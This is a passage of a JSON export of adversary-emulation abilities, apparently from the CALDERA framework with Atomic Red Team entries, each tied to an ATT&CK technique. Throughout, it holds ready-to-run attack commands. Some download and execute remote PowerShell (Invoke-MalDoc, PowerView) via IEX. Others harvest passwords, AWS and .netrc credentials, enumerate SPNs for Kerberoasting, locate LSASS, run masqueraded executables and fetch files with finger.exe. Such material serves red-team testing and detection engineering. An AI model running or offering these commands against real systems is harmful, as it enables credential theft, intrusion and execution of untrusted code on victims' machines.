$env:TEMP\\windows-credentials.txt\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores", "ability_id": "935e8026584b85192519c57d7080b048", "technique_id": "T1555", "tactic": "credential-access", "requirements": [], "name": "Extract Windows Credential Manager via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "setspn -T %USERDNSDOMAIN% -Q */*", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "ability_id": "e0496104d8da1ada94001fe7778e7402", "technique_id": "T1558.003", "tactic": "credential-access", "requirements": [], "name": "Extract all accounts in use as SPN using setspn", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\"); $macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts", "ability_id": "b7f89af9214876eae185527350ca034f", "technique_id": "T1564", "tactic": "defense-evasion", "requirements": [], "name": "Extract binary files via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Extracting credentials from files\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "grep -ri password /", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "info.created"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "grep -ri password /", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "37479c168bb93ed053c5c4843ac01729", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [{"relationship_match": [{"source": "no.logs"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "fw.disabled"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Extract passwords with grep", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "findstr /si pass *.xml *.doc *.txt *.xls; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "aeb4fdbb3453127caaef0ad5c250d838", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "Extracting passwords with findstr", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "b0e28215c59037cc6cdb61b38615c32d", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "File Download via PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["4bd145_T1036.003_masquerading.vbs", "107417_T1036.003_masquerading.ps1"], "parsers": [], "cleanup": ["del /f %temp%\\T1036.003_masquerading.docx.exe > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.pdf.exe > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.ps1.exe > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.xls.vbs > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.xlsx.vbs > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.png.vbs > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.doc.ps1 > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.pdf.ps1 > nul 2>&1 && del /f %temp%\\T1036.003_masquerading.rtf.ps1 > nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy C:\\Windows\\System32\\calc.exe %temp%\\T1036.003_masquerading.docx.exe /Y && copy C:\\Windows\\System32\\calc.exe %temp%\\T1036.003_masquerading.pdf.exe /Y && copy C:\\Windows\\System32\\calc.exe %temp%\\T1036.003_masquerading.ps1.exe /Y && copy 4bd145_T1036.003_masquerading.vbs %temp%\\T1036.003_masquerading.xls.vbs /Y && copy 4bd145_T1036.003_masquerading.vbs %temp%\\T1036.003_masquerading.xlsx.vbs /Y && copy 4bd145_T1036.003_masquerading.vbs %temp%\\T1036.003_masquerading.png.vbs /Y && copy 107417_T1036.003_masquerading.ps1 %temp%\\T1036.003_masquerading.doc.ps1 /Y && copy 107417_T1036.003_masquerading.ps1 %temp%\\T1036.003_masquerading.pdf.ps1 /Y && copy 107417_T1036.003_masquerading.ps1 %temp%\\T1036.003_masquerading.rtf.ps1 /Y && %temp%\\T1036.003_masquerading.docx.exe && %temp%\\T1036.003_masquerading.pdf.exe && %temp%\\T1036.003_masquerading.ps1.exe && %temp%\\T1036.003_masquerading.xls.vbs && %temp%\\T1036.003_masquerading.xlsx.vbs && %temp%\\T1036.003_masquerading.png.vbs && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Masquerading: Rename System Utilities", "ability_id": "ff78708e0e18d31c0be7a2be295158ec", "technique_id": "T1036.003", "tactic": "defense-evasion", "requirements": [], "name": "File Extension Masquerading", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Hunts for files of a certain extension and inserts a message", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["mission.go"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "./mission.go -duration 60 -extension .caldera -dir '/'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["mission.go"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "./mission.go -duration 60 -extension .caldera -dir '/'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["mission.go"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\\", "language": null, "name": "cmd", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["mission.go"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data Manipulation: Stored Data Manipulation", "ability_id": "55f9600a-756f-496b-b27f-682052dc429c", "technique_id": "T1565.001", "tactic": "impact", "requirements": [], "name": "File Hunter Mission", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find or discover files on the file system", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem -Path #{host.system.path}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e", "technique_id": "T1083", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "host.system.path"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "File and Directory Discovery", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "ls -recurse; get-childitem -recurse; gci -recurse", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "d7967a23c8c030c698893f242e622be1", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "File and Directory Discovery (PowerShell)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\T1083Test1.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "dir /s c:\\ >> %temp%\\T1083Test1.txt && dir /s \"c:\\Documents and Settings\" >> %temp%\\T1083Test1.txt && dir /s \"c:\\Program Files\\\" >> %temp%\\T1083Test1.txt && dir \"%systemdrive%\\Users\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\T1083Test1.txt && tree /F >> %temp%\\T1083Test1.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "File and Directory Discovery", "ability_id": "a09dd05a4de1fd52c13deada3209e4aa", "technique_id": "T1083", "tactic": "discovery", "requirements": [], "name": "File and Directory Discovery (cmd.exe)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "finger base64_filedata@localhost", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "7262a40d1253cb58b4e54fc1aacc938a", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "File download with finger.exe on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/t1040_macos_pcapdemo"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo /tmp/t1040_macos_pcapdemo -f -i en0 -t 3", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "38609b9decfc9731e611769bb4923f1b", "technique_id": "T1040", "tactic": "multiple", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Filtered Packet Capture macOS using /dev/bpfN with sudo", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find local AWS credentials from file, defaults to using / as the look path.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find / -name \"credentials\" -type f -path \"*/.aws/*\" 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find / -name \"credentials\" -type f -path \"*/.aws/*\" 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "12b56ab7e1f7739b1a60f6d8098a7ce7", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "Find AWS credentials", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find Domain information", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.nbtstat", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "network.domain.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nbtstat -n", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "14a21534-350f-4d83-9dd7-3c56b93a0c17", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "Find Domain", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This ability will locate directories that are cloned Git repositories.", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.git"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "for directoryname in $(find /home/ -name '.git' -type d 2>/dev/null | head -5); do\n\tprintf \"$(dirname \"$directoryname\")\\n\";\ndone;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.git"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.git"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Data from Local System", "ability_id": "720a3356-eee1-4015-9135-0fc08f7eb2d5", "technique_id": "T1005", "tactic": "collection", "requirements": [], "name": "Find Git Repositories", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find hostname of remote host", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "nbtstat -A #{remote.host.ip}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Find Hostname", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Grep for IP addresses in file system per user", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data from Local System", "ability_id": "d69e8660-62c9-431e-87eb-8cf6bd4e35cf", "technique_id": "T1005", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "host.user.name"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Find IP addresses", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get process info for LSASS", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "parserconfigs": [{"custom_parser_vals": {"json_key": "Id", "json_type": "int"}, "edge": "", "target": "", "source": "host.process.id"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabLsassProcess()\n        {\n            Process[] allProc = Process.GetProcessesByName(\"lsass\");\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabLsassProcess();\n        }\n    }\n}", "timeout": 60, "build_target": "GetLsass.exe", "platform": "windows", "command": null, "language": "csharp", "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "Find LSASS", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "0a96ef5851da1be487cebdd9a1f86b7a", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Find Local Admins via Group Policy (PowerView)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find OS Version", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[environment]::OSVersion.Version", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "b6b105b9-41dc-490b-bc5c-80d699b82ce8", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Find OS Version", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find System Network Connections", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "netstat -anto", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "netstat -anto", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netstat -anto;\nGet-NetTCPConnection", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Connections Discovery", "ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8", "technique_id": "T1049", "tactic": "discovery", "requirements": [], "name": "Find System Network Connections", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials In Files", "ability_id": "c3a2cfa1e1d09d61d00b86bc5e09986f", "technique_id": "T1552.001", "tactic": "credential-access", "requirements": [], "name": "Find and Access Github Credentials", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "8ddfaf982ab359cda13626b870ccb339", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "Find and Display Internet Explorer Browser Version", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist; /usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "099c4e98d840c7fba1724e8015b88a20", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "Find and Display Safari Browser Version", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Grep for all emails for the given target company", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data from Local System", "ability_id": "1f7ff232-ebf8-42bf-a3c4-657855794cfe", "technique_id": "T1005", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "host.user.name"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Find company emails", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "cfcf66cc85109ad2ebdb301d619fa41f", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "Find computers where user has session - Stealth mode (PowerView)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Discover all directories containing deletable files by user", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;", "language": null, "name": "sh", "variations": [], "uploads": []}], 